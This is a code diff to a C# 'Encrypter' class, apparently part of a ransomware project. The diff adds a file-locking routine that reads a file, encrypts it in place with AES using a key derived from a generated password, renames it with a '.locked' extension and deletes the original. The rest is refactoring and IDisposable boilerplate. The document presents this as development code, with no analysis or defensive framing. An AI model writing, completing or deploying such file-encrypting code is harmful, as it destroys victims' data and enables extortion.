@@ -17,16 +17,19 @@ using System.Text;
 
 namespace Setember;
 
-public class Encrypter
+public class Encrypter : IDisposable
 {
-    private static byte[] Key { get; set; }
-    private static byte[] IV { get; set; }
-    private static string Password { get; set; }
-    private static byte[] PasswordBytes { get; set; }
+    private byte[] Key { get; set; }
+    private byte[] IV { get; set; }
+    private string Password { get; set; }
+    private byte[] PasswordBytes { get; set; }
 
-    private static readonly byte[] Salt = new byte[] {
+    private static readonly byte[] Salt = new byte[]
+    {
         10, 20, 30, 40, 50, 60, 70, 80
     };
+
+    private bool disposedValue;
 
     public Encrypter()
     {
@@ -40,7 +43,7 @@ public class Encrypter
     public async Task<byte[]> EncryptWithAES(byte[] byteToEncrypt)
     {
         byte[] encryptedBytes = null;
-        using (var ms = new MemoryStream())
+        using (var memoryStream = new MemoryStream())
         {
             using (var aes = Aes.Create())
             {
@@ -52,25 +55,43 @@ public class Encrypter
 
                 aes.Mode = CipherMode.CBC;
 
-                using (var cryptoStream = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
+                using (var cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
                 {
                     await cryptoStream.WriteAsync(byteToEncrypt, 0, byteToEncrypt.Length);
                     cryptoStream.Close();
                 }
-                encryptedBytes = ms.ToArray();
+                encryptedBytes = memoryStream.ToArray();
             }
         }
         return encryptedBytes;
     }
 
-    protected byte[] GetPasswordBytes(string password)
-        => SHA512.Create().ComputeHash(Encoding.UTF8.GetBytes(password));
+    public async Task EncryptFileAsync(string filePath)
+    {
+        byte[] bytesToEncrypt = File.ReadAllBytes(filePath);
 
+        await Task.Run(async () =>
+        {
+            byte[] encryptedBytes = await EncryptWithAES(bytesToEncrypt);
+            await File.WriteAllBytesAsync(filePath, encryptedBytes);
+            try
+            {
+                File.Move(filePath, filePath + ".locked");
+            }
+            catch (Exception ex) { }
+            finally
+            {
+                File.Delete(filePath);
+            }
+        });
+    }
+
+    #region Password and Key generation
     protected List<byte[]> GenAESKey(byte[] passwordBytes, int KeySizeInBytes = 32, int BlockSizeInBytes = 16)
     {
         var keys = new List<byte[]>();
 
-        const ushort iterations = 1000;
+        const ushort iterations = 5000;
         var keyGenerator = new Rfc2898DeriveBytes(passwordBytes, Salt, iterations);
 
         // keys[0] = AES.Key
@@ -81,18 +102,8 @@ public class Encrypter
         return keys;
     }
 
-    public async Task EncryptFileAsync(string filePath, string password)
-    {
-        byte[] bytesToEncrypt = File.ReadAllBytes(filePath);
-        byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
-
-        await Task.Run(() =>
-        {
-            passwordBytes = SHA512.Create().ComputeHash(passwordBytes);
-            //await File.WriteAllBytesAsync(filePath, );
-            File.Move(filePath, filePath + ".locked");
-        });
-    }
+    protected byte[] GetPasswordBytes(string password)
+        => SHA512.Create().ComputeHash(Encoding.UTF8.GetBytes(password));
 
     protected string CreatePassword(int passwordLength)
     {
@@ -105,4 +116,36 @@ public class Encrypter
         }
         return password.ToString();
     }
+    #endregion
+
+    #region Disposing resources
+    protected virtual void Dispose(bool disposing)
+    {
+        if (!disposedValue)
+        {
+            if (disposing)
+            {
+                // TODO: dispose managed state (managed objects)
+            }
+
+            // TODO: free unmanaged resources (unmanaged objects) and override finalizer
+            // TODO: set large fields to null
+            disposedValue = true;
+        }
+    }
+
+    // // TODO: override finalizer only if 'Dispose(bool disposing)' has code to free unmanaged resources
+    // ~Encrypter()
+    // {
+    //     // Do not change this code. Put cleanup code in 'Dispose(bool disposing)' method
+    //     Dispose(disposing: false);
+    // }
+
+    public void Dispose()
+    {
+        // Do not change this code. Put cleanup code in 'Dispose(bool disposing)' method
+        Dispose(disposing: true);
+        GC.SuppressFinalize(this);
+    }
+    #endregion
 }
